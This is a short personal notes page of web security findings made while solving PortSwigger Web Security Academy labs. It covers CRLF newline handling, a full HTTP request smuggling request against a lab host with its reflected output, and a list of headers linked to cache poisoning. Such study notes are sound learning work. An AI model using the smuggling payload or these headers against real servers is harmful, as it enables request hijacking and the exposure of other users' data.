# Mad security findings

This is crazy stuff I found out in the wild. I will put here only the ones, which are the most crazy in my opinion and caused my brain to question reality. Most of those I found out during solving Portswigger’s Web security academy labs or another security sandbox labs.

### Newlines

Seems trivial, but keep in mind HTTP Requests must have **two(!!!)** additional newlines at the request ending. There may be cases when they must be present on smuggled requests. Newlines in HTTP requests are used the ones with carriage return `\r\n`.

Looks like, mostly, web-servers are dismissing requests which contain solely newline character without carriage return (just `\n`, not `\r\n`). However, this can be potentially interesting way to exploit webservers or topic to research. 

## Request Smuggling

When it comes to request smuggling, there is a way how to expose request modification done by frontend server (CT.TE request smuggling). For example consider following request:

```
POST / HTTP/1.1
Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 251

0

POST / HTTP/1.1
Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 260

search=POST /foo HTTP/1.1
Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.web-security-academy.net
```

This request expose request content into `search` param, which is then baked into outputting HTML. However the ending result is following:

```
0 search results for 'POST /foo HTTP/1.1
Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.web-security-academy.net
POST / HTTP/1.1
X-HEADER-AD: 11.155.222.156
Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 251

0
```

Request contains subsequent request, merged together. Wierd thing is, that it did not fail, because of double headers. **TODO: Investigate.**

## Interesting headers

Different curious headers are connected to cache poisoning. (They may be coming from underlying frameworks, etc.).

- [Location](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Location)
- [X-Forwarded-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host)
- X-Forwarded-Scheme
- `X-Original-URL` - Coming from underlying ZEND framework (PHP Symphony is built upon this)
- The rest of `X-Forwarded ...` request headers.
